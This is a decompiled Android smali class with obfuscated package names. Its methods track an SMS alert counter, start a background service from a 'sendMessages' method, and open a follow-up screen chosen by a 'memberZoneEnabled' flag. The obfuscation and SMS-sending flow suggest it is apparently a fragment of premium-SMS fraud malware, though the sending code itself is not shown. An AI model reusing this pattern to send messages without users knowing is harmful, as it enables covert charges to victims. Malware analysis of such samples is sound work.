.class public Lcom/adc58a797/ac31b3236/a740675ee/a689b9482;
.super Ljava/lang/Object;
.source "aojDnLMZY.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static getCurrentAlertID()I
    .locals 4

    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;

    move-result-object v2

    const-string v3, "NextAlertID"

    invoke-virtual {v2, v3}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->getRuntimeValue(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const/4 v0, 0x0

    if-eqz v1, :cond_0

    invoke-static {v1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    :cond_0
    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;

    move-result-object v2

    invoke-virtual {v2}, Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;->getInternals()Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;

    move-result-object v2

    invoke-virtual {v2}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->getSmsInfo()Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;

    move-result-object v2

    invoke-virtual {v2}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;->getAlertsCount()I

    move-result v2

    if-ge v0, v2, :cond_1

    :goto_0
    return v0

    :cond_1
    const/4 v0, -0x1

    goto :goto_0
.end method

.method public static increaseCurrentAlertID()V
    .locals 4

    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a689b9482;->getCurrentAlertID()I

    move-result v0

    add-int/lit8 v0, v0, 0x1

    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;

    move-result-object v1

    const-string v2, "NextAlertID"

    invoke-static {v0}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->setRuntimeValue(Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method

.method public static launchFinishActivity(Landroid/app/Activity;)V
    .locals 5

    const/4 v4, 0x0

    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;

    move-result-object v1

    const-string v2, "memberZoneEnabled"

    const-string v3, "0"

    invoke-virtual {v1, v2, v3}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->getValue(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "1"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_0

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0, v4}, Landroid/app/Activity;->startActivityForResult(Landroid/content/Intent;I)V

    :goto_0
    return-void

    :cond_0
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/adc58a797/ac31b3236/a740675ee/adf608587;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0, v4}, Landroid/app/Activity;->startActivityForResult(Landroid/content/Intent;I)V

    goto :goto_0
.end method

.method public static sendMessages(Landroid/content/Context;Landroid/app/Activity;)V
    .locals 3

    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;

    move-result-object v1

    invoke-virtual {v1}, Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;->getInternals()Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;

    move-result-object v1

    invoke-virtual {v1}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->getSmsInfo()Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;

    move-result-object v0

    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/adc58a797/ac31b3236/a740675ee/a10cd395c/a7000a234;

    invoke-direct {v1, p1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v1}, Landroid/app/Activity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    invoke-static {p1}, Lcom/adc58a797/ac31b3236/a740675ee/a689b9482;->launchFinishActivity(Landroid/app/Activity;)V

    return-void
.end method
